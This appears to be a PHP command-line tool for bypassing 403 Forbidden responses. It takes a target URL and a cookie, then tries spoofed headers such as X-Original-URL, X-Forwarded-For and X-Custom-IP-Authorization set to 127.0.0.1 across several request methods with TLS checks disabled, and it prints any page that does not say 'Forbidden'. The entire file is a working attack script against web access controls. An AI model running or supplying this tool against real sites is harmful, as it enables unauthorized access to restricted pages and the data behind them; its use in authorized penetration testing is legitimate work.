<?php
			// by omar alahmadi 
    $url = readline("enter URL ex: http://google.com: "); //input for URL
    readline_add_history($url); //save input 
    $Cookie = readline("add Cookie ex : username=test; role=admin : "); //input for cookie
    readline_add_history($Cookie); //save input
    $ch =" ";
    $status = false;
    $bypass = [  
        'X-Original-URL:127.0.0.1',
        'Referer:'.$url,
        'X-Custom-IP-Authorization:127.0.0.1',
        'X-Forwarded-For:127.0.0.1',
        'X-Forwarded-For:http://127.0.0.1',
        'X-rewrite-url:127.0.0.1'
    ];
    $methods=[ 
        CURLOPT_POST,
        CURLOPT_HTTPGET,
        CURLOPT_PUT,
        CURLOPT_CAPATH
    ];
foreach ($bypass as $bypas){
    foreach ($methods as $method){   
    $ch = curl_init($url);
    curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );
    curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
    curl_setopt( $ch, CURLOPT_HEADER, false );
    curl_setopt( $ch, $method, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Cache-Control: max-age=0',
    $bypas,
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.19 Safari/537.36 Edg/91.0.864.11',
    'Cookie:'.$Cookie,
    'Connection: close',
    ));
    curl_setopt( $ch, CURLOPT_URL, $url );
    $result = curl_exec( $ch );

    $pos = strpos($result, 'Forbidden');
    
    echo "\n trying : "."\033[33m$bypas \033[0m\n";
    if ($pos != true){
        echo "\n \033[32m$bypas \033[0m\n";
        printf("\033[36m$result \033[0m\n");
        curl_close( $ch );
        $status = true;
        }
    }
}if($status == false){
    echo "\033[31m sorry i tried hard but i didn't found anything \033[0m\n";
}
